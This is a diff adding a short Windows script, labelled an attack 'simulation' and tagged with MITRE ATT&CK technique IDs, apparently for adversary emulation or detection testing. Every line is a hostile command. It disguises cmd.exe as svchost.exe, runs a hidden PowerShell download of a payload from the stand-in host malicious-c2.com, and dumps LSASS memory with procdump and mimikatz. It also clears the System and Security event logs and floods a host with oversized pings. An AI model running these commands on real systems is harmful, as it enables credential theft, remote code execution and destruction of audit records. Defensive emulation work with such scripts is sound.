@@ -1,0 +1,19 @@
+# Malicious Script Execution & Credential Dumping Simulation
+# -----------------------------------------------------------
+
+# Masquerading (T1036)
+copy "C:\Windows\System32\cmd.exe" "C:\Users\Public\svchost.exe"
+
+# Command and Scripting Interpreter (T1059)
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "Invoke-WebRequest -Uri 'http://malicious-c2.com/payload.exe' -OutFile 'C:\\Users\\Public\\payload.exe'"
+
+# OS Credential Dumping (T1003)
+procdump.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# Defense Evasion / Clearing Logs
+wevtutil.exe cl System
+wevtutil.exe cl Security
+
+# Endpoint Denial of Service (T1499)
+ping 192.168.1.100 -n 1000 -l 65500
